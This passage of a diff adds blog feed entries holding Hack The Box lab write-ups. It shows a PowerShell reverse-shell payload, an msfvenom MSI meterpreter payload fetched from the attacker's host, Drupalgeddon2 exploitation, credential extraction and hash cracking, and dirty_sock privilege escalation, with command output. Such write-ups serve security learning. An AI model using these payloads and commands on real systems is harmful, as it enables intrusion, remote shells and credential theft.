+&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;powershell -c &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;client = New-Object System.Net.Sockets.TCPClient(&apos;10.10.14.204&apos;,9000);&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;stream = &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;client.GetStream();[byte[]]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bytes = 0..65535|%&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;while((&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;i = &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;stream.Read(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bytes, 0, &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bytes.Length)) -ne 0){;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bytes,0, &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;i);&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sendback = (iex &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;data 2&amp;gt;&amp;amp;1 | Out-String );&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sendback2 = &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sendback + &apos;PS &apos; + (pwd).Path + &apos;&amp;gt; &apos;;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sendbyte = ([text.encoding]::ASCII).GetBytes(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sendback2);&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;stream.Write(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sendbyte,0,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sendbyte.Length);&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;stream.Flush();}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;client.Close()&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I then started a reverse shell&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 9000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And uploaded this PHP file as an image. And it worked, no validate on the type of file being uploaded at all!!&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ampp&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;tdocs&lt;span class=&quot;se&quot;&gt;\o&lt;/span&gt;mrs&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;mages&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;love&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;hoebe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;privesc&quot;&gt;Privesc&lt;/h1&gt;
+&lt;p&gt;Now that I have a low level shell, it’s time to begin enumeration again to determine how to move to a system shell. After checking a few of the standard enumeration paths, I noticed the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-batch highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;PS&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;C&lt;/span&gt;:\xampp\htdocs\omrs\images&amp;gt; &lt;span class=&quot;nb&quot;&gt;reg&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;HKEY_CURRENT_USER&lt;/span&gt;\Software\Policies\Microsoft\Windows\Installer
+
+&lt;span class=&quot;kd&quot;&gt;HKEY_CURRENT_USER&lt;/span&gt;\Software\Policies\Microsoft\Windows\Installer
+    &lt;span class=&quot;kd&quot;&gt;AlwaysInstallElevated&lt;/span&gt;    &lt;span class=&quot;kd&quot;&gt;REG_DWORD&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;PS&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;C&lt;/span&gt;:\xampp\htdocs\omrs\images&amp;gt; &lt;span class=&quot;nb&quot;&gt;reg&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;HKEY_LOCAL_MACHINE&lt;/span&gt;\Software\Policies\Microsoft\Windows\Installer
+
+&lt;span class=&quot;kd&quot;&gt;HKEY_LOCAL_MACHINE&lt;/span&gt;\Software\Policies\Microsoft\Windows\Installer
+    &lt;span class=&quot;kd&quot;&gt;AlwaysInstallElevated&lt;/span&gt;    &lt;span class=&quot;kd&quot;&gt;REG_DWORD&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Because those (either one) are set to true, that means that any user is able to execute a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.msi&lt;/code&gt; as system! So I then crafted an MSI payload:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.204 &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1234 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; msi &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; rshell1234.msi
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] No &lt;span class=&quot;nb&quot;&gt;arch &lt;/span&gt;selected, selecting &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of msi file: 159744 bytes
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Back on Windows I executed the installer&lt;/p&gt;
+
+&lt;div class=&quot;language-batch highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;msiexec&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;/q /i &lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;http&lt;/span&gt;://10.10.14.204/rshell1234.msi
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And on my machine I had a metasploit listener set up&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;msfconsole &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.14.204; set lport 1234; run&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Using configured payload generic/shell_reverse_tcp
+payload &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; windows/meterpreter/reverse_tcp
+lhost &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 10.10.14.204
+lport &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 1234
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.14.204:1234 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Sending stage &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;175174 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to 10.10.10.239
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Meterpreter session 1 opened &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.14.204:1234 -&amp;gt; 10.10.10.239:62952&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-06-10 20:59:28 &lt;span class=&quot;nt&quot;&gt;-0400&lt;/span&gt;
+
+meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell
+Process 7128 created.
+Channel 1 created.
+Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.19042.867]
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2020 Microsoft Corporation. All rights reserved.
+
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
+&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
+
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And success! We now have a system shell!!&lt;/p&gt;</content><author><name>Alex Loney</name></author><category term="blog" /><category term="writeup" /><category term="htb" /><category term="htb" /><category term="htb easy" /><category term="offsec" /><summary type="html">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</summary></entry><entry><title type="html">HTB: Armageddon Writeup</title><link href="/blog/writeup/htb/htb-armageddon/" rel="alternate" type="text/html" title="HTB: Armageddon Writeup" /><published>2021-06-08T22:23:00-07:00</published><updated>2021-06-08T22:23:00-07:00</updated><id>/blog/writeup/htb/htb-armageddon</id><content type="html" xml:base="/blog/writeup/htb/htb-armageddon/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
+
+&lt;h2 id=&quot;nmap&quot;&gt;nmap&lt;/h2&gt;
+
+&lt;p&gt;As always, beginning with an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; of the box to determine what is open&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;nmap/armageddon.nmap
+&lt;span class=&quot;c&quot;&gt;# Nmap 7.91 scan initiated Tue Jun  8 18:06:58 2021 as: nmap -sC -sV -oA nmap/armageddon 10.10.10.233&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.233
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.078s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.6 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;CentOS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; PHP/5.4.16&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Nmap done at Tue Jun  8 18:07:10 2021 -- 1 IP address (1 host up) scanned in 12.08 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With only two ports open, looks like we’ll be doing something with the web server.&lt;/p&gt;
+
+&lt;h2 id=&quot;web-server&quot;&gt;Web Server&lt;/h2&gt;
+
+&lt;p&gt;Browsing to the webpage, it appears to be running Druple 7, after a bit of exploring and googling about the version, there appears to be something referred to as “Drupalgeddon”, which I will explore next.&lt;/p&gt;
+
+&lt;h1 id=&quot;foothold&quot;&gt;Foothold&lt;/h1&gt;
+
+&lt;h2 id=&quot;apache-user&quot;&gt;Apache User&lt;/h2&gt;
+
+&lt;p&gt;Looking into the “Drupalgeddon” vulnerability, Metasploit already has a package for it, since the server appears to be vulnerable, we can give it a try.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;msfconsole &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;use exploit/unix/webapp/drupal_drupalgeddon2; set lhost 10.10.14.204; set rhost 10.10.10.233; run&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Which worked, first try! Granting us a shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apache&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;brucetherealadmin-user&quot;&gt;brucetherealadmin User&lt;/h2&gt;
+
+&lt;p&gt;Once in the Apache user, we can take a look at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;settings.php&lt;/code&gt; file to locate the database username/password:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /var/www/html/sites/default/settings.php
+...&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;snip&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;...
+&lt;span class=&quot;nv&quot;&gt;$databases&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; array &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
+  &lt;span class=&quot;s1&quot;&gt;&apos;default&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 
+  array &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
+    &lt;span class=&quot;s1&quot;&gt;&apos;default&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 
+    array &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
+      &lt;span class=&quot;s1&quot;&gt;&apos;database&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;drupal&apos;&lt;/span&gt;,
+      &lt;span class=&quot;s1&quot;&gt;&apos;username&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;drupaluser&apos;&lt;/span&gt;,
+      &lt;span class=&quot;s1&quot;&gt;&apos;password&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;CQHEy@9M*m23gBVj&apos;&lt;/span&gt;,
+      &lt;span class=&quot;s1&quot;&gt;&apos;host&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;localhost&apos;&lt;/span&gt;,
+      &lt;span class=&quot;s1&quot;&gt;&apos;port&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;,
+      &lt;span class=&quot;s1&quot;&gt;&apos;driver&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;mysql&apos;&lt;/span&gt;,
+      &lt;span class=&quot;s1&quot;&gt;&apos;prefix&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;,
+    &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,
+  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,
+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+...&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;snip&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Looks like we now have a database login, trying that password for both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brucetherealadmin&lt;/code&gt; results are unsuccessful, so neither of the users are reusing this password.&lt;/p&gt;
+
+&lt;p&gt;Moving on, we can try logging into the MySQL database, but given that we do not have an interactive session, we can’t directly connect to MySQL and execute commands. However, we can execute a single query at a time from the CLI.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mysql &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; drupaluser &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; drupal &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;select * from users;&quot;&lt;/span&gt;
+password: CQHEy@9M&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;m23gBVj
+...&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;snip&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;...
+brucetherealadmin &lt;span class=&quot;nv&quot;&gt;$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97&lt;/span&gt;.oOsUf1xAhaadURt admin@armageddon.eu
+...&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;snip&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Alright, looks like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brucetherealadmin&lt;/code&gt; created an account on the Druple site, and this account has a password. I wonder if Bruce decided to reuse the password? Well, lets try and crack it first. JTR understands the Druple format, so we can throw this hash into JTR and see what comes up.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; pass.txt
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt; /usr/share/wordlists/rockyou.txt &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Drupal7 pass.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Almost instantly, JTR returns with the found password for Bruce. Giving that a try with SSH, Success!&lt;/p&gt;
+
+&lt;h1 id=&quot;privesc&quot;&gt;Privesc&lt;/h1&gt;
+
+&lt;p&gt;Once logged in as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brucetherealadmin&lt;/code&gt;, the first thing to notice is that Bruce has access to install snap plugins as root:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+...&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;snip&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;...
+User brucetherealadmin may run the following commands on armageddon:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/snap &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;What can we do with this?&lt;/p&gt;
+
+&lt;p&gt;After researching snap plugins, it looks like there’s a “dirty_sock” exploit that may be able to be used to install a snap file and have it create a new user that has access to use sudo. Specifically the &lt;a href=&quot;https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py&quot;&gt;dirty_sockv2.py&lt;/a&gt; which contains a snap payload already.&lt;/p&gt;
+
+&lt;p&gt;Grabbing the snap payload from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dirty_sockv2.py&lt;/code&gt; script and placing it into a text file and decoding it as such:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vim dirty.snap.b64
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; dirty.snap.b64 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; dirty.snap
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then, we can install this snap&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;snap &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;dirty.snap &lt;span class=&quot;nt&quot;&gt;--devmode&lt;/span&gt;
+dirty-sock 0.1 installed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Well, that appears to have worked, lets give it a try…&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su dirty_sock
+Password: dirty_sock
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;dirty_sock@armageddon brucetherealadmin]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;dirty_sock
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Looks promising! Lets try and change to root&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;dirty_sock: dirty_sock
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@armageddon brucetherealadmin]#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Great! We’re now root!&lt;/p&gt;
+
+&lt;h1 id=&quot;noteobservation&quot;&gt;Note/observation&lt;/h1&gt;
+
+&lt;p&gt;During the process of rooting this, I first looked into crafting my own snap plugin, and I was able to craft one by creating a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snap.yaml&lt;/code&gt; file as such:&lt;/p&gt;
+
